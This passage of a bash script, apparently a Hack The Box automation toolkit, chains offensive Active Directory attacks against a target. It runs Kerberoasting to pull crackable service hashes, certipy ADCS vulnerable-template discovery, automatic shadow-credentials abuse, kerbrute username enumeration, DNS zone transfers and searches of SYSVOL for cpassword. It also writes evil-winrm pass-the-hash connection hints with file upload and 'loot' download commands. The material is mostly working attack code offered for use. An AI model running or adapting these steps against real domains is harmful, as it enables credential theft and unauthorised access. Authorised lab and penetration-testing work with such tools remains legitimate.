  if [ "$LDAPDOMAINDUMP" != "1" ]; then
    log "LDAPDOMAINDUMP=0 -> skipping ldapdomaindump"
    return
  fi
  if ! have ldapdomaindump; then
    log "ldapdomaindump introuvable -> ignoré"
    return
  fi
  if ! ensure_ldap_auth; then
    log "ldapdomaindump ignoré (auth LDAP non confirmée)."
    return
  fi

  section "Phase 2b: ldapdomaindump"
  local U="$AD_USER_BEST"
  local outdir="ldapdomaindump"

  if echo "$U" | grep -q '@'; then
    U="${U%@*}"
    U="${DOMAIN}\\${U}"
  elif ! echo "$U" | grep -q '\\'; then
    U="${DOMAIN}\\${U}"
  fi

  ldapdomaindump -u "$U" -p "$AD_PASS" -o "$outdir" -n "$TARGET" "ldap://$TARGET" 2>&1 \
    | tee "${outdir}/ldapdomaindump.log" | mask_pass >/dev/null || true

  if find "$outdir" -maxdepth 1 -type f \( -name "*.html" -o -name "*.json" -o -name "*.grep" -o -name "*.csv" \) | grep -q .; then
    LDAPDOMAINDUMP_DONE=1
    good "Sortie ldapdomaindump écrite dans ${outdir}/"
  else
    bad "ldapdomaindump may have failed. Check ${outdir}/ldapdomaindump.log"
  fi
}

phase_dns_enum() {
  if [ "$DNS_ENUM" != "1" ]; then
    log "DNS_ENUM=0 -> skipping DNS enumeration"
    return
  fi
  if ! have dig && ! have host && ! have nslookup; then
    log "No DNS tools found -> skipping DNS enumeration"
    return
  fi

  section "Phase 2c : énumération DNS AD"
  local zone="$DOMAIN"

  if have dig; then
    dig @"$TARGET" "$zone" AXFR +time=3 +tries=1 > dns_enum/axfr.txt 2>&1 || true
    dig @"$TARGET" "_ldap._tcp.dc._msdcs.${zone}" SRV +short > dns_enum/srv_ldap_dc.txt 2>/dev/null || true
    dig @"$TARGET" "_kerberos._tcp.${zone}" SRV +short > dns_enum/srv_kerberos.txt 2>/dev/null || true
    dig @"$TARGET" "${DC}" A +short > dns_enum/dc_a.txt 2>/dev/null || true
  fi

  if have host; then
    host -t srv "_ldap._tcp.dc._msdcs.${zone}" "$TARGET" > dns_enum/host_srv_ldap.txt 2>&1 || true
    host -t srv "_kerberos._tcp.${zone}" "$TARGET" > dns_enum/host_srv_kerberos.txt 2>&1 || true
  fi

  if [ "$AUTH_MODE" = "1" ] && [ "$BLOODYAD_ENUM" = "1" ] && { have bloodyAD || have bloodyad; }; then
    local bloody_bin="bloodyAD"
    have bloodyAD || bloody_bin="bloodyad"
    "$bloody_bin" -d "$DOMAIN" -u "${AD_USER_BEST##*\\}" -p "$AD_PASS" --host "$DC" --dc-ip "$TARGET" get dnsDump --zone "$zone" \
      > dns_enum/bloodyad_dnsdump.txt 2>&1 || true
  fi

  DNS_ENUM_DONE=1
}

phase_kerberoast() {
  if [ "$KERBEROAST" != "1" ]; then
    log "KERBEROAST=0 -> skipping Kerberoast"
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "Kerberoast ignoré (pas d'identifiants confirmés)."
    return
  fi
  if [ -z "${GETUSERSPNS_BIN:-}" ]; then
    log "GetUserSPNs introuvable -> Kerberoast ignoré"
    return
  fi

  section "Phase 3f: Kerberoast"
  local U="$AD_USER_BEST"
  U="${U##*\\}"
  U="${U%@*}"
  local target_spec="${DOMAIN}/${U}:${AD_PASS}"
  local out_file="kerberos/kerberoast_hashes.txt"

  if [ "$GETTGT_OK" = "1" ] && [ -f "attack_checks/${U}.ccache" ]; then
    KRB5CCNAME="$(pwd)/attack_checks/${U}.ccache" "$GETUSERSPNS_BIN" "${DOMAIN}/${U}" -dc-ip "$TARGET" -k -no-pass -request -outputfile "$out_file" \
      2>&1 | tee kerberos/kerberoast.log | mask_pass >/dev/null || true
  else
    "$GETUSERSPNS_BIN" "$target_spec" -dc-ip "$TARGET" -request -outputfile "$out_file" \
      2>&1 | tee kerberos/kerberoast.log | mask_pass >/dev/null || true
  fi

  if [ -s "$out_file" ]; then
    KERBEROAST_DONE=1
    good "Hashes Kerberoast écrits dans $out_file"
  else
    log "No Kerberoast hashes produced."
  fi
}

phase_adcs_enum() {
  if [ "$ADCS_ENUM" != "1" ]; then
    log "ADCS_ENUM=0 -> skipping ADCS enumeration"
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "Énumération ADCS ignorée (pas d'identifiants confirmés)."
    return
  fi
  if ! have certipy-ad && ! have certipy; then
    log "Certipy introuvable -> énumération ADCS ignorée"
    return
  fi

  section "Phase 3g : énumération ADCS (certipy-ad)"
  local certipy_bin="certipy-ad"
  have certipy-ad || certipy_bin="certipy"
  local U="$AD_USER_BEST"
  local user_upn="$U"
  if ! echo "$user_upn" | grep -q '@'; then
    user_upn="${U##*\\}@${DOMAIN}"
  fi

  # --- certipy find (vulnerable templates) ---
  log "certipy find: enumerating ADCS templates and CAs..."
  "$certipy_bin" find -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" -target "$DC" -ns "$TARGET" \
    -vulnerable -stdout -json -text -output adcs/certipy_find \
    2>&1 | tee adcs/certipy_find.log | mask_pass >/dev/null || true

  if grep -qiE 'Vulnerable|ESC[0-9]|Certificate Authorities|Templates' adcs/certipy_find.log 2>/dev/null || \
     [ -s adcs/certipy_find_Certipy.json ]; then
    ADCS_ENUM_DONE=1
    CTX_ADCS=1
    good "Résultats d'énumération ADCS écrits dans adcs/"
  else
    log "Certipy did not return clear ADCS findings."
  fi

  # --- Extract CA name from output ---
  if [ -z "$CERTIPY_CA_NAME" ]; then
    CERTIPY_CA_NAME="$(grep -oP '(?<=CA Name\s{0,20}:\s{0,5})\S+' adcs/certipy_find.log 2>/dev/null | head -1 || true)"
    if [ -z "$CERTIPY_CA_NAME" ] && [ -s adcs/certipy_find_Certipy.json ]; then
      CERTIPY_CA_NAME="$(grep -oP '(?<="ca_name":\s{0,2}")([^"]+)' adcs/certipy_find_Certipy.json 2>/dev/null | head -1 || true)"
    fi
  fi
  [ -n "$CERTIPY_CA_NAME" ] && good "CA Name detected: $CERTIPY_CA_NAME"

  # --- Extract ESC flags detected ---
  CERTIPY_ESC_FLAGS="$(grep -oP 'ESC[0-9]+' adcs/certipy_find.log 2>/dev/null | sort -u | tr '\n' ' ' | sed 's/ $//' || true)"
  [ -n "$CERTIPY_ESC_FLAGS" ] && good "Vulnerable ESC flags: $CERTIPY_ESC_FLAGS"

  # --- certipy ca (CA permissions enumeration) ---
  if [ -n "$CERTIPY_CA_NAME" ]; then
    log "certipy ca: enumerating CA permissions..."
    "$certipy_bin" ca -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" -target "$DC" \
      -ca "$CERTIPY_CA_NAME" \
      2>&1 | tee adcs/certipy_ca.log | mask_pass >/dev/null || true
    [ -s adcs/certipy_ca.log ] && good "Permissions CA écrites dans adcs/certipy_ca.log"
  fi

  # --- certipy shadow (shadow credentials / msDS-KeyCredentialLink) ---
  local plain_user="${AD_USER_BEST##*\\}"
  plain_user="${plain_user%@*}"
  log "certipy shadow auto: testing shadow credentials against $plain_user..."
  "$certipy_bin" shadow auto -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" \
    -account "$plain_user" \
    2>&1 | tee adcs/certipy_shadow.log | mask_pass >/dev/null || true
  if grep -qiE 'Got hash|NT hash|Saved certificate|TGT' adcs/certipy_shadow.log 2>/dev/null; then
    good "Shadow credentials successful — check adcs/certipy_shadow.log"
    CTX_ADCS=1
  else
    log "Shadow credentials: no result (account may not be writable or PKINIT not available)"
  fi
}

adcs_prepare_context() {
  if [ "$ADCS_ENUM" != "1" ]; then
    log "ADCS_ENUM=0 -> skipping ADCS enumeration"
    return 1
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "Énumération ADCS ignorée (pas d'identifiants confirmés)."
    return 1
  fi
  if ! have certipy-ad && ! have certipy; then
    log "Certipy introuvable -> énumération ADCS ignorée"
    return 1
  fi
  return 0
}

adcs_get_certipy_bin() {
  local certipy_bin="certipy-ad"
  have certipy-ad || certipy_bin="certipy"
  printf '%s' "$certipy_bin"
}

adcs_get_user_upn() {
  local U="$AD_USER_BEST"
  local user_upn="$U"
  if ! echo "$user_upn" | grep -q '@'; then
    user_upn="${U##*\\}@${DOMAIN}"
  fi
  printf '%s' "$user_upn"
}

adcs_try_find() {
  local certipy_bin="$1"
  local user_upn="$2"
  local certipy_timeout="${CERTIPY_TIMEOUT_SECS:-45}"
  log "certipy find: enumerating ADCS templates and CAs..."
  if have timeout && echo "$certipy_timeout" | grep -Eq '^[0-9]+$' && [ "$certipy_timeout" -gt 0 ]; then
    timeout "${certipy_timeout}s" \
      "$certipy_bin" find -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" -target "$DC" -ns "$TARGET" \
      -vulnerable -stdout -json -text -output adcs/certipy_find \
      2>&1 | tee adcs/certipy_find.log | mask_pass >/dev/null || true
    if grep -qiE "timed out|deadline exceeded" adcs/certipy_find.log 2>/dev/null || [ "${PIPESTATUS[0]:-0}" = "124" ]; then
      log "certipy find a dépassé ${certipy_timeout}s -> arrêt contrôlé"
    fi
  else
    "$certipy_bin" find -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" -target "$DC" -ns "$TARGET" \
      -vulnerable -stdout -json -text -output adcs/certipy_find \
      2>&1 | tee adcs/certipy_find.log | mask_pass >/dev/null || true
  fi

  if grep -qiE 'Vulnerable|ESC[0-9]|Certificate Authorities|Templates' adcs/certipy_find.log 2>/dev/null || \
     [ -s adcs/certipy_find_Certipy.json ]; then
    ADCS_ENUM_DONE=1
    CTX_ADCS=1
    good "Résultats d'énumération ADCS écrits dans adcs/"
  else
    log "Certipy did not return clear ADCS findings."
  fi

  if [ -z "$CERTIPY_CA_NAME" ]; then
    CERTIPY_CA_NAME="$(grep -oP '(?<=CA Name\s{0,20}:\s{0,5})\S+' adcs/certipy_find.log 2>/dev/null | head -1 || true)"
    if [ -z "$CERTIPY_CA_NAME" ] && [ -s adcs/certipy_find_Certipy.json ]; then
      CERTIPY_CA_NAME="$(grep -oP '(?<="ca_name":\s{0,2}")([^"]+)' adcs/certipy_find_Certipy.json 2>/dev/null | head -1 || true)"
    fi
  fi
  [ -n "$CERTIPY_CA_NAME" ] && good "CA Name detected: $CERTIPY_CA_NAME"

  CERTIPY_ESC_FLAGS="$(grep -oP 'ESC[0-9]+' adcs/certipy_find.log 2>/dev/null | sort -u | tr '\n' ' ' | sed 's/ $//' || true)"
  [ -n "$CERTIPY_ESC_FLAGS" ] && good "Vulnerable ESC flags: $CERTIPY_ESC_FLAGS"
}

phase_certipy_find() {
  adcs_prepare_context || return
  section "Phase 3g : énumération ADCS (certipy find)"
  local certipy_bin user_upn
  certipy_bin="$(adcs_get_certipy_bin)"
  user_upn="$(adcs_get_user_upn)"
  adcs_try_find "$certipy_bin" "$user_upn"
}

phase_certipy_ca() {
  adcs_prepare_context || return
  section "Phase 3h : permissions CA (certipy ca)"
  local certipy_bin user_upn
  certipy_bin="$(adcs_get_certipy_bin)"
  user_upn="$(adcs_get_user_upn)"

  if [ -z "$CERTIPY_CA_NAME" ]; then
    if [ -s adcs/certipy_find.log ] || [ -s adcs/certipy_find_Certipy.json ]; then
      adcs_try_find "$certipy_bin" "$user_upn"
    fi
  fi
  if [ -z "$CERTIPY_CA_NAME" ]; then
    log "CA Name non détecté -> certipy ca ignoré"
    return
  fi

  log "certipy ca: enumerating CA permissions..."
  "$certipy_bin" ca -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" -target "$DC" \
    -ca "$CERTIPY_CA_NAME" \
    2>&1 | tee adcs/certipy_ca.log | mask_pass >/dev/null || true
  [ -s adcs/certipy_ca.log ] && good "Permissions CA écrites dans adcs/certipy_ca.log"
}

phase_certipy_shadow() {
  adcs_prepare_context || return
  section "Phase 3i : shadow credentials (certipy shadow)"
  local certipy_bin user_upn plain_user
  certipy_bin="$(adcs_get_certipy_bin)"
  user_upn="$(adcs_get_user_upn)"
  plain_user="${AD_USER_BEST##*\\}"
  plain_user="${plain_user%@*}"

  log "certipy shadow auto: testing shadow credentials against $plain_user..."
  "$certipy_bin" shadow auto -u "$user_upn" -p "$AD_PASS" -dc-ip "$TARGET" \
    -account "$plain_user" \
    2>&1 | tee adcs/certipy_shadow.log | mask_pass >/dev/null || true
  if grep -qiE 'Got hash|NT hash|Saved certificate|TGT' adcs/certipy_shadow.log 2>/dev/null; then
    good "Shadow credentials successful — check adcs/certipy_shadow.log"
    CTX_ADCS=1
  else
    log "Shadow credentials: no result (account may not be writable or PKINIT not available)"
  fi
}

phase_bloodyad_checks() {
  if [ "$BLOODYAD_ENUM" != "1" ]; then
    log "BLOODYAD_ENUM=0 -> skipping bloodyAD checks"
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "Vérifications bloodyAD ignorées (pas d'identifiants confirmés)."
    return
  fi
  if ! have bloodyAD && ! have bloodyad; then
    log "bloodyAD introuvable -> ignoré"
    return
  fi

  section "Phase 3h: bloodyAD Safe Checks"
  local bloody_bin="bloodyAD"
  have bloodyAD || bloody_bin="bloodyad"
  local U="$AD_USER_BEST"
  U="${U##*\\}"
  U="${U%@*}"

  "$bloody_bin" -d "$DOMAIN" -u "$U" -p "$AD_PASS" --host "$DC" --dc-ip "$TARGET" get writable --detail \
    > bloodyad/writable.txt 2>&1 || true
  "$bloody_bin" -d "$DOMAIN" -u "$U" -p "$AD_PASS" --host "$DC" --dc-ip "$TARGET" get trusts \
    > bloodyad/trusts.txt 2>&1 || true
  "$bloody_bin" -d "$DOMAIN" -u "$U" -p "$AD_PASS" --host "$DC" --dc-ip "$TARGET" get search \
    --filter "(msDS-AllowedToDelegateTo=*)" --attr sAMAccountName,msDS-AllowedToDelegateTo \
    > bloodyad/constrained_delegation.txt 2>&1 || true
  "$bloody_bin" -d "$DOMAIN" -u "$U" -p "$AD_PASS" --host "$DC" --dc-ip "$TARGET" get search \
    --filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" --attr sAMAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity \
    > bloodyad/rbcd.txt 2>&1 || true

  if [ -s bloodyad/writable.txt ] || [ -s bloodyad/trusts.txt ]; then
    BLOODYAD_ENUM_DONE=1
    good "Résultats bloodyAD écrits dans bloodyad/"
  fi
}

phase_mssql_enum() {
  if [ "$MSSQL_ENUM" != "1" ]; then
    log "MSSQL_ENUM=0 -> skipping MSSQL enumeration"
    return
  fi
  if [ "$MSSQL_AUTH_OK" != "1" ] && [ "$CTX_MSSQL" != "1" ]; then
    log "Énumération MSSQL ignorée (contexte non détecté)."
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "Énumération MSSQL ignorée (pas d'identifiants confirmés)."
    return
  fi
  if [ -z "${MSSQLCLIENT_BIN:-}" ]; then
    log "No MSSQL client available -> skipping"
    return
  fi

  section "Phase 3i : énumération MSSQL"
  local U="$AD_USER_BEST"
  U="${U##*\\}"
  U="${U%@*}"

  cat > mssql_enum/commands.sql <<'EOF'
SELECT @@version;
SELECT name FROM master..sysdatabases;
EXEC sp_linkedservers;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EOF

  "$MSSQLCLIENT_BIN" -windows-auth "${DOMAIN}/${U}:${AD_PASS}@${TARGET}" -dc-ip "$TARGET" -target-ip "$TARGET" -file mssql_enum/commands.sql \
    2>&1 | tee mssql_enum/mssqlclient.log | mask_pass >/dev/null || true

  if [ -s mssql_enum/mssqlclient.log ]; then
    MSSQL_ENUM_DONE=1
    good "Énumération MSSQL écrite dans mssql_enum/"
  fi
}

phase_winrm_operator_checks() {
  if [ "$WINRM_CHECK" != "1" ]; then
    return
  fi
  if [ "$CTX_WINRM" != "1" ] && [ "$WINRM_AUTH_OK" != "1" ]; then
    log "Vérifications opérateur WinRM ignorées (contexte non détecté)."
    return
  fi

  section "Phase 3j: WinRM Operator Checks"
  if have evil-winrm; then
    {
      echo "evil-winrm appears installed at: $(command -v evil-winrm)"
      echo "Target: $TARGET"
      echo "User:   ${AD_USER_BEST}"
      echo "Hint:   evil-winrm -i $TARGET -u \"${AD_USER_BEST##*\\}\" -p 'REDACTED'"
    } > winrm_enum/connection_hint.txt
    WINRM_SHELL_DONE=1
    good "Hints opérateur WinRM écrits dans winrm_enum/connection_hint.txt"
  else
    log "evil-winrm introuvable ; conservation des seules vérifications d'en-têtes wsman."
  fi
}

phase_winrm_checks() {
  section "Phase 3j : WinRM"
  mkdir -p attack_checks winrm_enum

  winrm_safe_checks

  if [ "$AUTH_MODE" = "1" ] && [ "$NXC_HAS" = "1" ] && echo "$NXC_MODULES" | grep -qw "winrm"; then
    local U="${AD_USER_BEST:-$AD_USER_RAW}"
    local U_SHORT
    U_SHORT="$(normalize_user_short "$U")"

    log "Test WinRM dédié avec les credentials fournis..."
    if [ -n "${AD_PASS:-}" ]; then
      run_save "attack_checks/winrm_auth_test.txt" nxc winrm "$TARGET" -u "$U" -p "$AD_PASS" -d "$DOMAIN" || true
    elif [ -n "${AD_NT_HASH:-}" ]; then
      run_save "attack_checks/winrm_auth_test.txt" nxc winrm "$TARGET" -u "$U_SHORT" -H "$AD_NT_HASH" -d "$DOMAIN" || true
    elif [ -n "${KRB5CCNAME:-}" ]; then
      run_save "attack_checks/winrm_auth_test.txt" env "KRB5CCNAME=$KRB5CCNAME" nxc winrm "$TARGET" -u "$U" -d "$DOMAIN" --use-kcache || true
    fi

    if [ -f attack_checks/winrm_auth_test.txt ] && looks_auth_ok "attack_checks/winrm_auth_test.txt"; then
      WINRM_AUTH_OK=1
      AUTH_OK=1
      good "Authentification WinRM valide détectée."
    fi
  fi

  update_context_flags
  phase_winrm_operator_checks
}

phase_evil_winrm_prep() {
  section "Phase 3k : evil-winrm prep"
  mkdir -p winrm_enum

  if [ "$WINRM_CHECK" = "1" ] && [ "$CTX_WINRM" != "1" ] && [ "$WINRM_AUTH_OK" != "1" ]; then
    log "Contexte WinRM non confirmé -> lancement d'une vérification rapide."
    winrm_safe_checks
    if [ "$AUTH_MODE" = "1" ] && [ "$NXC_HAS" = "1" ] && echo "$NXC_MODULES" | grep -qw "winrm"; then
      local U_TRY="${AD_USER_BEST:-$AD_USER_RAW}"
      if [ -n "${AD_PASS:-}" ]; then
        run_save "attack_checks/winrm_auth_test.txt" nxc winrm "$TARGET" -u "$U_TRY" -p "$AD_PASS" -d "$DOMAIN" || true
      elif [ -n "${AD_NT_HASH:-}" ]; then
        run_save "attack_checks/winrm_auth_test.txt" nxc winrm "$TARGET" -u "$(normalize_user_short "$U_TRY")" -H "$AD_NT_HASH" -d "$DOMAIN" || true
      fi
      if [ -f attack_checks/winrm_auth_test.txt ] && looks_auth_ok "attack_checks/winrm_auth_test.txt"; then
        WINRM_AUTH_OK=1
      fi
      update_context_flags
    fi
  fi

  if [ "$CTX_WINRM" != "1" ] && [ "$WINRM_AUTH_OK" != "1" ]; then
    bad "Préparation evil-winrm ignorée : WinRM non détecté ou auth non confirmée."
    return
  fi

  local U="${AD_USER_BEST:-$AD_USER_RAW}"
  local U_SHORT
  U_SHORT="$(normalize_user_short "$U")"
  local user_display="${U_SHORT:-$U}"
  local host_target="${TARGET}"

  {
    echo "evil-winrm prep"
    echo "================"
    echo "Cible:  $host_target"
    echo "Domaine: ${DOMAIN}"
    echo "Utilisateur: ${U}"
    echo
    if have evil-winrm; then
      echo "evil-winrm installé: $(command -v evil-winrm)"
    else
      echo "evil-winrm introuvable dans le PATH"
    fi
    echo
    echo "[connexion]"
    if [ -n "${AD_PASS:-}" ]; then
      echo "evil-winrm -i $host_target -u \"$user_display\" -p 'REDACTED'"
    fi
    if [ -n "${AD_NT_HASH:-}" ]; then
      echo "evil-winrm -i $host_target -u \"$user_display\" -H ${AD_NT_HASH}"
    fi
    if [ -n "${KRB5CCNAME:-}" ]; then
      echo "evil-winrm -i $host_target -u \"$user_display\" -r \"${DOMAIN}\""
      echo "export KRB5CCNAME=${KRB5CCNAME}"
    fi
    echo
    echo "[post-connexion]"
    echo "whoami"
    echo "hostname"
    echo "ipconfig /all"
    echo "whoami /groups"
    echo "dir C:\\Users"
    echo
    echo "[transfert]"
    echo "upload local.txt C:\\Windows\\Temp\\local.txt"
    echo "download C:\\Windows\\Temp\\loot.txt ./loot.txt"
    echo
    echo "[stabilisation / opsec]"
    echo "menu"
    echo "services"
    echo "avoid obvious noisy commands until privilege context is clear"
  } > winrm_enum/connection_hint.txt

  {
    echo "#!/usr/bin/env bash"
    echo "# aide opérateur générée par HTBTOOLBOX"
    if [ -n "${AD_PASS:-}" ]; then
      echo "echo \"evil-winrm -i $host_target -u \\\"$user_display\\\" -p 'REDACTED'\""
    elif [ -n "${AD_NT_HASH:-}" ]; then
      echo "echo \"evil-winrm -i $host_target -u \\\"$user_display\\\" -H ${AD_NT_HASH}\""
    elif [ -n "${KRB5CCNAME:-}" ]; then
      echo "echo \"export KRB5CCNAME=${KRB5CCNAME}\""
      echo "echo \"evil-winrm -i $host_target -u \\\"$user_display\\\" -r \\\"${DOMAIN}\\\"\""
    else
      echo "echo \"Aucun credential exploitable pour evil-winrm\""
    fi
  } > winrm_enum/evil_winrm_ready.sh
  chmod +x winrm_enum/evil_winrm_ready.sh 2>/dev/null || true

  WINRM_SHELL_DONE=1
  good "Préparation opérateur WinRM écrite dans winrm_enum/"
}

phase_gpo_parse() {
  if [ "$GPO_PARSE" != "1" ]; then
    log "GPO_PARSE=0 -> skipping GPO/SYSVOL parsing"
    return
  fi

  section "Phase 4b: GPO and SYSVOL Parsing"
  : > gpo/gpp_candidates.txt
  : > gpo/logon_scripts.txt
  : > gpo/scheduled_tasks.txt

  find downloads -type f \( -iname "Groups.xml" -o -iname "Services.xml" -o -iname "ScheduledTasks.xml" -o -iname "Printers.xml" -o -iname "Drives.xml" \) \
    -print 2>/dev/null | sort -u > gpo/gpp_candidates.txt || true
  find downloads -type f \( -iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" \) \
    -path "*SYSVOL*" -print 2>/dev/null | sort -u > gpo/logon_scripts.txt || true
  grep -RHiE 'cpassword|UserId|runAs|password|Command' downloads/* 2>/dev/null > gpo/scheduled_tasks.txt || true

  if [ -s gpo/gpp_candidates.txt ] || [ -s gpo/logon_scripts.txt ] || [ -s gpo/scheduled_tasks.txt ]; then
    GPO_PARSE_DONE=1
    good "Résultats de parsing GPO/SYSVOL écrits dans gpo/"
  fi
}

# ============================================================
# Énumération RPC (anonyme + authentifiée)
# ============================================================
rpc_enum() {
  section "Phase 3 : énumération RPC"
  rpcclient -U "" -N "$TARGET" -c "enumdomusers;quit" 2>&1 | tee rpc_users.txt || true
  rpcclient -U "" -N "$TARGET" -c "enumdomgroups;quit" 2>&1 | tee rpc_groups.txt || true
  awk -F'[][]' '/^user:\[/ {print $2}' rpc_users.txt 2>/dev/null | sed '/^$/d' | sort -u > users_rpc.txt || true

  local U="$AD_USER_BEST"
  local U_SHORT
  U_SHORT="$(normalize_user_short "$U")"
  if [ "$RPC_AUTH_OK" = "1" ]; then
    log "RPC authenticated enum users/groups/password policy"
    rpcclient -U "${DOMAIN}\\${U_SHORT}%${AD_PASS}" "$TARGET" -c "enumdomusers;quit" 2>&1 | tee rpc_users_auth.txt | mask_pass || true
    rpcclient -U "${DOMAIN}\\${U_SHORT}%${AD_PASS}" "$TARGET" -c "enumdomgroups;quit" 2>&1 | tee rpc_groups_auth.txt | mask_pass || true
    rpcclient -U "${DOMAIN}\\${U_SHORT}%${AD_PASS}" "$TARGET" -c "getdompwinfo;quit" 2>&1 | tee rpc_passpol.txt | mask_pass || true
    rpcclient -U "${DOMAIN}\\${U_SHORT}%${AD_PASS}" "$TARGET" -c "querydominfo;quit" 2>&1 | tee rpc_dominfo.txt | mask_pass || true
    awk -F'[][]' '/^user:\[/ {print $2}' rpc_users_auth.txt 2>/dev/null | tr -d '\r' | sort -u > users_rpc_auth.txt || true
    good "Utilisateurs RPC authentifiés trouvés : $(wc -l < users_rpc_auth.txt 2>/dev/null || echo 0)"
  fi
}

# ============================================================
# WinRM SAFE checks
# ============================================================
winrm_safe_checks() {
  if [ "$WINRM_CHECK" != "1" ]; then
    return
  fi
  section "Phase 3b: WinRM Safe Checks"

  if have curl; then
    curl -sS -m 6 -k "http://${TARGET}:5985/wsman" -I > attack_checks/winrm_wsman_5985_headers.txt 2>&1 || true
    curl -sS -m 6 -k "https://${TARGET}:5986/wsman" -I > attack_checks/winrm_wsman_5986_headers.txt 2>&1 || true
    if grep -qiE "HTTP/1|Server:" attack_checks/winrm_wsman_5985_headers.txt 2>/dev/null; then
      CTX_WINRM=1
      good "WinRM port 5985 is responding."
    fi
  fi
  update_context_flags
}

kerberos_user_enum() {
  : > users_kerb.txt
  if [ "$KERB_USER_ENUM" != "1" ]; then
    log "KERB_USER_ENUM=0 -> skipping kerbrute userenum"
    return
  fi

  if [ -t 0 ]; then
    local run_kerb
    read -rp "Run Phase 3c Kerberos username enum now? [y/N]: " run_kerb
    case "${run_kerb:-}" in
      y|Y|yes|YES) ;;
      *)
        log "Phase 3c ignorée sur choix utilisateur."
        return
        ;;
    esac

    local kerb_max_in kerb_timeout_in
    read -rp "Kerberos userenum max users [$KERB_MAX_USERS]: " kerb_max_in
    if [ -n "${kerb_max_in:-}" ]; then
      KERB_MAX_USERS="$kerb_max_in"
    fi
    read -rp "Kerberos userenum timeout seconds [$KERB_TIMEOUT_SECS]: " kerb_timeout_in
    if [ -n "${kerb_timeout_in:-}" ]; then
      KERB_TIMEOUT_SECS="$kerb_timeout_in"
    fi
  fi

  section "Phase 3c : énumération Kerberos des noms d'utilisateur"

  if [ ! -f "$USER_WORDLIST" ]; then
    log "Wordlist kerbrute introuvable : $USER_WORDLIST"
    return
  fi

  local kerb_users_file="$USER_WORDLIST"
  local max_users="${KERB_MAX_USERS:-0}"
  local timeout_secs="${KERB_TIMEOUT_SECS:-0}"

  if ! echo "$max_users" | grep -Eq '^[0-9]+$'; then max_users=0; fi
  if ! echo "$timeout_secs" | grep -Eq '^[0-9]+$'; then timeout_secs=0; fi

  if [ "$max_users" -gt 0 ]; then
    head -n "$max_users" "$USER_WORDLIST" > attack_checks/kerb_userenum_list.txt 2>/dev/null || true
    if [ -s attack_checks/kerb_userenum_list.txt ]; then
      kerb_users_file="attack_checks/kerb_userenum_list.txt"
    fi
  fi
  log "Kerberos userenum list: $kerb_users_file ($(wc -l < "$kerb_users_file" 2>/dev/null || echo 0) entries)"

  if have kerbrute; then
    log "Phase 3c: Kerberos username enum (kerbrute)"
    if [ "$timeout_secs" -gt 0 ] && have timeout; then
      timeout "${timeout_secs}s" kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$kerb_users_file" 2>&1 | tee kerbrute_userenum.txt >/dev/null || true
      if [ "${PIPESTATUS[0]:-0}" = "124" ]; then
        log "kerbrute timeout reached (${timeout_secs}s). Partial results in kerbrute_userenum.txt"
      fi
    else
      kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$kerb_users_file" 2>&1 | tee kerbrute_userenum.txt >/dev/null || true
    fi
    grep -Eo 'VALID USERNAME:[[:space:]]+[^[:space:]]+' kerbrute_userenum.txt 2>/dev/null \
      | awk '{print $3}' | sed 's/@.*$//' | sort -u > users_kerb.txt || true
    good "Kerberos valid usernames (kerbrute): $(wc -l < users_kerb.txt 2>/dev/null || echo 0)"
    return
  fi

  if [ -n "${GETNPUSERS_BIN:-}" ]; then
    log "kerbrute absent -> fallback userenum via ${GETNPUSERS_BIN}"
    if [ "$timeout_secs" -gt 0 ] && have timeout; then
      timeout "${timeout_secs}s" "$GETNPUSERS_BIN" "${DOMAIN}/" -dc-ip "$TARGET" -no-pass -usersfile "$kerb_users_file" 2>&1 \
        | tee kerb_userenum_getnp.txt >/dev/null || true
    else
      "$GETNPUSERS_BIN" "${DOMAIN}/" -dc-ip "$TARGET" -no-pass -usersfile "$kerb_users_file" 2>&1 \
        | tee kerb_userenum_getnp.txt >/dev/null || true
    fi

    {
      grep -Eo '^[-\[]+[[:space:]]*User[[:space:]]+[^[:space:]]+' kerb_userenum_getnp.txt 2>/dev/null | awk '{print $3}'
      grep -Eo '^\$krb5asrep\$[0-9]+\$[^@:$]+' kerb_userenum_getnp.txt 2>/dev/null | awk -F'$' '{print $4}'
    } | sed 's/@.*$//' | sed '/^$/d' | sort -u > users_kerb.txt || true

    good "Kerberos valid usernames (GetNPUsers fallback): $(wc -l < users_kerb.txt 2>/dev/null || echo 0)"
    return
  fi

  log "No kerbrute and no GetNPUsers tool -> kerberos user enum skipped."
}

# ============================================================
# enum4linux-ng - JSON mode + jq parsing
# ============================================================
enum4linux_phase() {
  : > users_enum4linux.txt
  : > enum4linux/passpol.txt

  if [ "$ENUM4LINUX" != "1" ]; then
    log "ENUM4LINUX=0 -> skipping enum4linux-ng"
    return
  fi
  if ! have enum4linux-ng; then
    log "enum4linux-ng introuvable -> ignoré"
    return
  fi

  section "Phase 3d: enum4linux-ng (JSON mode)"

  local e4l_args="-A"
  local json_out="enum4linux/enum4linux_output"

  # Prefer JSON output when supported for easier parsing.
  if enum4linux-ng --help 2>&1 | grep -q "\-oJ\|--output-json"; then
    log "Running enum4linux-ng in JSON mode..."
    if [ "$AUTH_MODE" = "1" ] && [ "$AUTH_OK" = "1" ]; then
      local U="$AD_USER_BEST"
      U="${U##*\\}"; U="${U%@*}"
      enum4linux-ng $e4l_args -u "$U" -p "$AD_PASS" "$TARGET" -oJ "$json_out" 2>&1 \
        | tee enum4linux/enum4linux_ng.log | mask_pass >/dev/null || true
    else
      enum4linux-ng $e4l_args "$TARGET" -oJ "$json_out" 2>&1 \
